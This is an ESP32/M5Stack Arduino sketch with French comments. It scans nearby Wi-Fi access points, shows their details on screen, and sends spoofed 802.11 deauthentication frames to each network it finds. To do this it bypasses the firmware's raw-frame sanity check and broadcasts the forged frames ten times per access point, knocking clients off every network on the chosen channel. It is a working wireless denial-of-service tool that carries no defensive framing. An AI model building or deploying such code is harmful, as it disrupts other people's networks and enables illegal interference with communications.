#include <esp_now.h>
#include <WiFi.h>
#include "esp_wifi.h"  // Nécessaire pour la fonction deauth
#include <M5Unified.h> // Bibliothèque pour M5Stack (Affichage et Boutons)

// Adresse de diffusion en broadcast
uint8_t broadcastAddress[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
esp_now_peer_info_t peerInfo;

#define mac_history_len 512

struct mac_addr {
  unsigned char bytes[6];
};
struct mac_addr mac_history[mac_history_len];
unsigned int mac_history_cursor = 0;

typedef struct struct_message {
  char bssid[64];
  char ssid[32];
  char encryptionType[16];
  int32_t channel;
  int32_t rssi;
  int boardID;
} struct_message;

int boardID = 1; 
int currentChannel = 1; // Canal par défaut

struct_message myData;

unsigned long lastTime = 0;
unsigned long timerDelay = 200;  // Délai entre les envois
unsigned long clearMacHistoryTime = 0;  // Timer pour vider la liste des APs
unsigned long macHistoryInterval = 60000;  // Intervalle pour vider l'historique des APs

// Callback pour informer de l'état de l'envoi ESP-NOW
void OnDataSent(const uint8_t* mac_addr, esp_now_send_status_t status) {
  Serial.print("\r\nLast Packet Send Status:\t");
  Serial.println(status == ESP_NOW_SEND_SUCCESS ? "Delivery Success" : "Delivery Fail");
}

void save_mac(unsigned char* mac) {
  if (mac_history_cursor >= mac_history_len) {
    mac_history_cursor = 0;
  }
  struct mac_addr tmp;
  memcpy(tmp.bytes, mac, 6);
  mac_history[mac_history_cursor] = tmp;
  mac_history_cursor++;
}

boolean seen_mac(unsigned char* mac) {
  struct mac_addr tmp;
  memcpy(tmp.bytes, mac, 6);
  for (int x = 0; x < mac_history_len; x++) {
    if (mac_cmp(tmp, mac_history[x])) {
      return true;
    }
  }
  return false;
}

boolean mac_cmp(struct mac_addr addr1, struct mac_addr addr2) {
  for (int y = 0; y < 6; y++) {
    if (addr1.bytes[y] != addr2.bytes[y]) {
      return false;
    }
  }
  return true;
}

void clear_mac_history() {
  // Réinitialiser l'historique des MACs
  mac_history_cursor = 0;
  memset(mac_history, 0, sizeof(mac_history));
  Serial.println("MAC history cleared.");
}

extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
  if (arg == 31337)
    return 1;
  else
    return 0;
}

void sendDeauthPacket(uint8_t *apMac, uint8_t channel) {
  uint8_t deauthPacket[26] = {
    0xC0, 0x00, // Type/Subtype: Deauthentication (0xC0)
    0x3A, 0x01, // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source: AP MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID: AP MAC
    0x00, 0x00, // Fragment number and sequence number
    0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
  };

  memcpy(&deauthPacket[10], apMac, 6);  // AP MAC address
  memcpy(&deauthPacket[16], apMac, 6);  // BSSID (AP MAC)

  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE); // Changer de canal
  for (int i = 0; i < 10; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false); // Envoyer le paquet
    delay(1);
  }

  Serial.println("Deauth packets sent");
  Serial.println("===============================");
}

String security_int_to_string(int security_type) {
  // Convertit le type de sécurité en chaîne lisible
  switch (security_type) {
    case WIFI_AUTH_OPEN:
      return "OPEN";
    case WIFI_AUTH_WEP:
      return "WEP";
    case WIFI_AUTH_WPA_PSK:
      return "WPA_PSK";
    case WIFI_AUTH_WPA2_PSK:
      return "WPA2_PSK";
    case WIFI_AUTH_WPA_WPA2_PSK:
      return "WPA/WPA2_PSK";
    case WIFI_AUTH_WPA2_ENTERPRISE:
      return "WPA2_ENTERPRISE";
    case WIFI_AUTH_WPA3_PSK:
      return "WPA3_PSK";
    default:
      return "UNKNOWN";
  }
}

void displayAPInfo(String ssid, String bssid, String security, int32_t rssi, int32_t channel) {
  M5.Lcd.clear();
  M5.Lcd.setCursor(5, 10);
  M5.Lcd.setTextSize(0);

  M5.Lcd.println("== AP Information ==");
  M5.Lcd.printf("Channel: %d\n\n", channel);
  M5.Lcd.printf("SSID:\n%s\n\n", ssid.c_str());
  M5.Lcd.printf("MAC:\n%s\n\n", bssid.c_str());
  M5.Lcd.printf("Security:\n%s\n\n", security.c_str());
  M5.Lcd.printf("RSSI: %d dBm\n", rssi);

}

void setup() {
  M5.begin(); // Initialise M5Stack
  Serial.begin(115200);
  pinMode(2, OUTPUT);  // LED interne
  WiFi.mode(WIFI_STA);

  // Afficher le canal initial
  M5.Lcd.clear();
  M5.Lcd.setTextSize(0);
  M5.Lcd.setCursor(10, 10);
  M5.Lcd.printf("Channel: %d", currentChannel);
}

void loop() {
  M5.update(); // Mise à jour des boutons
  char bufBSSID[64];
  char Buf[50];

  // Changer le canal avec le bouton A
  if (M5.BtnA.wasPressed()) {
    currentChannel++;
    if (currentChannel > 13) {  // Limiter les canaux WiFi à 13
      currentChannel = 1;
    }
    // Mettre à jour l'affichage du canal
    M5.Lcd.clear();
    M5.Lcd.setCursor(10, 10);
    M5.Lcd.printf("Current Channel: %d", currentChannel);
  }

  // Vérifie s'il est temps de vider l'historique des APs
  if ((millis() - clearMacHistoryTime) > macHistoryInterval) {
    clear_mac_history();  // Vide l'historique
    clearMacHistoryTime = millis();  // Réinitialise le timer
  }

  if ((millis() - lastTime) > timerDelay) {
    int n = WiFi.scanNetworks(false, true, false, 500, currentChannel);  // Scanner sur le canal actuel
    if (n == 0) {
      Serial.println("No networks found");
      M5.Lcd.clear();
      M5.Lcd.setCursor(10, 10);
      M5.Lcd.println("No networks found");
    } else {
      for (int8_t i = 0; i < n; i++) {
        if (seen_mac(WiFi.BSSID(i))) {
          Serial.println("We've already sent to " + WiFi.BSSIDstr(i));
          continue;
        }

        // Stocker le BSSID et SSID dans myData
        String MacString = WiFi.BSSIDstr(i).c_str();
        MacString.toCharArray(bufBSSID, 64);
        strcpy(myData.bssid, bufBSSID);

        String AP = WiFi.SSID(i);
        AP.toCharArray(Buf, 50);
        strcpy(myData.ssid, Buf);

        // Informations supplémentaires sur l'AP
        String securityType = security_int_to_string(WiFi.encryptionType(i));
        int32_t rssi = WiFi.RSSI(i);
        int32_t channel = WiFi.channel(i);

        // Afficher les informations sur l'AP dans le moniteur série
        Serial.println("=== Access Point Information ===");
        Serial.print("SSID: ");
        Serial.println(AP);
        Serial.print("BSSID (MAC): ");
        Serial.println(WiFi.BSSIDstr(i));
        Serial.print("Security: ");
        Serial.println(securityType);
        Serial.print("RSSI (Signal Strength): ");
        Serial.print(rssi);
        Serial.println(" dBm");
        Serial.print("Channel: ");
        Serial.println(channel);
        Serial.println("===============================");

        // Afficher les informations sur l'écran 
        displayAPInfo(AP, WiFi.BSSIDstr(i), securityType, rssi, channel);

        save_mac(WiFi.BSSID(i));  // Sauvegarder l'AP vu
        sendDeauthPacket(WiFi.BSSID(i), channel);  // Envoyer un paquet de deauth

        delay(200);
      }
      lastTime = millis();
    }
  }
}
